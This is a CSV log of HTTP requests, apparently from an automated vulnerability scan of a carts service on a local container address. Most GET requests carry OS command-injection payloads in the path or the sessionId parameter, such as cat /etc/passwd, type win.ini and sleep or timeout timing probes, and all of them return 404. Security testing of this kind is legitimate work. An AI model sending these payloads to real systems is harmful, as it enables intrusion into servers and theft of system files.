Id,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
1893,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%26cat+%2Fetc%2Fpasswd%26,404,Not Found,7,428,76
1894,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,6,428,32
1895,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%3Bcat+%2Fetc%2Fpasswd%3B,404,Not Found,7,426,76
1896,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%22%26cat+%2Fetc%2Fpasswd%26%22,404,Not Found,6,426,82
1897,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,47,428,32
1898,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,426,32
1899,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,5,428,32
1900,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%22%3Bcat+%2Fetc%2Fpasswd%3B%22,404,Not Found,52,428,82
1901,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%27%26cat+%2Fetc%2Fpasswd%26%27,404,Not Found,3,430,82
1902,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%27%3Bcat+%2Fetc%2Fpasswd%3B%27,404,Not Found,3,426,82
1903,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,48,428,32
1904,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,430,32
1905,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,426,32
1906,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,426,32
1907,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%26sleep+1.0%26,404,Not Found,50,428,66
1908,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:26 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,428,32
1909,Tue Mar 21 17:46:26 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%3Bsleep+1.0%3B,404,Not Found,14,428,66
1910,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,5,430,32
1911,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%22%26sleep+1.0%26%22,404,Not Found,5,430,72
1912,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,428,32
1913,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,430,32
1914,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,432,32
1915,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,430,32
1916,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,5,434,32
1917,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%22%3Bsleep+1.0%3B%22,404,Not Found,47,426,72
1918,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%27%26sleep+1.0%26%27,404,Not Found,3,430,72
1919,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%27%3Bsleep+1.0%3B%27,404,Not Found,4,428,72
1920,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=type+%25SYSTEMROOT%25%5Cwin.ini,404,Not Found,3,430,73
1921,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%26type+%25SYSTEMROOT%25%5Cwin.ini,404,Not Found,3,434,85
1922,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,404,Not Found,3,434,85
1923,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,50,432,32
1924,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,404,Not Found,5,430,94
1925,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,7,430,32
1926,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,404,Not Found,7,428,88
1927,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,428,32
1928,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,46,428,32
1929,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,404,Not Found,49,428,94
1930,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,5,428,32
1931,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,404,Not Found,6,430,88
1932,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,428,32
1933,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%26timeout+%2FT+1.0,404,Not Found,5,428,70
1934,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%7Ctimeout+%2FT+1.0,404,Not Found,3,426,70
1935,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%22%26timeout+%2FT+1.0%26%22,404,Not Found,4,428,79
1936,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%22%7Ctimeout+%2FT+1.0,404,Not Found,3,430,73
1937,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%27%26timeout+%2FT+1.0%26%27,404,Not Found,3,428,79
1938,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%27%7Ctimeout+%2FT+1.0,404,Not Found,3,430,73
1939,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,51,428,32
1940,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,426,32
1941,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,5,426,32
1942,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=get-help,404,Not Found,47,432,50
1943,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,24,430,32
1944,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,430,32
1945,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,5,426,32
1946,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%3Bget-help,404,Not Found,50,430,62
1947,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%22%3Bget-help,404,Not Found,3,428,65
1948,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%27%3Bget-help,404,Not Found,3,428,65
1949,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,50,430,32
1950,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,426,32
1951,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,426,32
1952,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%3Bget-help+%23,404,Not Found,47,428,66
1953,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%3Bstart-sleep+-s+1.0,404,Not Found,4,430,72
1954,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%22%3Bstart-sleep+-s+1.0,404,Not Found,3,432,75
1955,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,46,428,32
1956,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,5,432,32
1957,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,428,32
1958,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,432,32
1959,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,430,32
1960,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,428,32
1961,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,432,32
1962,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,428,32
1963,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%27%3Bstart-sleep+-s+1.0,404,Not Found,46,430,75
1964,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,428,32
1965,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1/merge?sessionId=sessionId%3Bstart-sleep+-s+1.0+%23,404,Not Found,8,426,76
1966,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,7,428,32
1967,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/cat+%2Fetc%2Fpasswd/merge?sessionId=sessionId,404,Not Found,45,430,64
1968,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%26cat+%2Fetc%2Fpasswd%26/merge?sessionId=sessionId,404,Not Found,3,428,76
1969,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%3Bcat+%2Fetc%2Fpasswd%3B/merge?sessionId=sessionId,404,Not Found,5,426,76
1970,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,71,433,32
1971,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,430,32
1972,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,428,32
1973,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,426,32
1974,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,432,32
1975,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%22%26cat+%2Fetc%2Fpasswd%26%22/merge?sessionId=sessionId,404,Not Found,47,430,82
1976,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,6,430,32
1977,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,426,32
1978,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%22%3Bcat+%2Fetc%2Fpasswd%3B%22/merge?sessionId=sessionId,404,Not Found,7,428,82
1979,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%27%26cat+%2Fetc%2Fpasswd%26%27/merge?sessionId=sessionId,404,Not Found,25,431,82
1980,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%27%3Bcat+%2Fetc%2Fpasswd%3B%27/merge?sessionId=sessionId,404,Not Found,5,432,82
1981,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,47,426,32
1982,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,428,32
1983,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,428,32
1984,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,426,32
1985,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%26sleep+1.0%26/merge?sessionId=sessionId,404,Not Found,46,434,66
1986,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%3Bsleep+1.0%3B/merge?sessionId=sessionId,404,Not Found,3,430,66
1987,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%22%26sleep+1.0%26%22/merge?sessionId=sessionId,404,Not Found,3,428,72
1988,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,47,432,32
1989,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,434,32
1990,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,5,430,32
1991,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%22%3Bsleep+1.0%3B%22/merge?sessionId=sessionId,404,Not Found,45,430,72
1992,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%27%26sleep+1.0%26%27/merge?sessionId=sessionId,404,Not Found,3,428,72
1993,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%27%3Bsleep+1.0%3B%27/merge?sessionId=sessionId,404,Not Found,4,428,72
1994,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,44,428,32
1995,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,432,32
1996,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,428,32
1997,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/type+%25SYSTEMROOT%25%5Cwin.ini/merge?sessionId=sessionId,404,Not Found,45,426,76
1998,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%26type+%25SYSTEMROOT%25%5Cwin.ini/merge?sessionId=sessionId,404,Not Found,3,428,85
1999,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%7Ctype+%25SYSTEMROOT%25%5Cwin.ini/merge?sessionId=sessionId,404,Not Found,3,428,85
2000,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22/merge?sessionId=sessionId,404,Not Found,4,428,94
2001,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini/merge?sessionId=sessionId,404,Not Found,2,430,88
2002,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27/merge?sessionId=sessionId,404,Not Found,5,428,94
2003,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,51,428,32
2004,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini/merge?sessionId=sessionId,404,Not Found,8,430,88
2005,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%26timeout+%2FT+1.0/merge?sessionId=sessionId,404,Not Found,10,428,70
2006,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%7Ctimeout+%2FT+1.0/merge?sessionId=sessionId,404,Not Found,4,428,70
2007,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%22%26timeout+%2FT+1.0%26%22/merge?sessionId=sessionId,404,Not Found,4,434,79
2008,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,47,430,32
2009,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,428,32
2010,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,5,426,32
2011,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,428,32
2012,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%22%7Ctimeout+%2FT+1.0/merge?sessionId=sessionId,404,Not Found,45,436,73
2013,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%27%26timeout+%2FT+1.0%26%27/merge?sessionId=sessionId,404,Not Found,3,426,79
2014,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%27%7Ctimeout+%2FT+1.0/merge?sessionId=sessionId,404,Not Found,4,432,73
2015,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,45,426,32
2016,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,426,32
2017,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,426,32
2018,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,426,32
2019,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,3,426,32
2020,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,428,32
2021,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,434,32
2022,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/get-help/merge?sessionId=sessionId,404,Not Found,63,429,53
2023,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%3Bget-help/merge?sessionId=sessionId,404,Not Found,3,428,62
2024,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%22%3Bget-help/merge?sessionId=sessionId,404,Not Found,3,426,65
2025,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,51,428,32
2026,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%27%3Bget-help/merge?sessionId=sessionId,404,Not Found,50,426,65
2027,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,20,428,32
2028,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,GET,http://172.18.0.4:30001/carts/param1%3Bget-help+%23/merge?sessionId=sessionId,404,Not Found,17,428,66
2029,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:27 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,15,426,32
2030,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:28 CET 2023,GET,http://172.18.0.4:30001/carts/param1%3Bstart-sleep+-s+1.0/merge?sessionId=sessionId,404,Not Found,40,427,72
2031,Tue Mar 21 17:46:27 CET 2023,Tue Mar 21 17:46:28 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,55,435,32
2032,Tue Mar 21 17:46:28 CET 2023,Tue Mar 21 17:46:28 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,5,430,32
2033,Tue Mar 21 17:46:28 CET 2023,Tue Mar 21 17:46:28 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,4,428,32
2034,Tue Mar 21 17:46:28 CET 2023,Tue Mar 21 17:46:28 CET 2023,GET,http://172.18.0.4:30001/carts/param1%22%3Bstart-sleep+-s+1.0/merge?sessionId=sessionId,404,Not Found,46,428,75
2035,Tue Mar 21 17:46:28 CET 2023,Tue Mar 21 17:46:28 CET 2023,POST,http://172.18.0.4:30001/carts/param1/items,404,Not Found,5,430,32
2036,Tue Mar 21 17:46:28 CET 2023,Tue Mar 21 17:46:28 CET 2023,GET,http://172.18.0.4:30001/carts/param1%27%3Bstart-sleep+-s+1.0/merge?sessionId=sessionId,404,Not Found,3,428,75
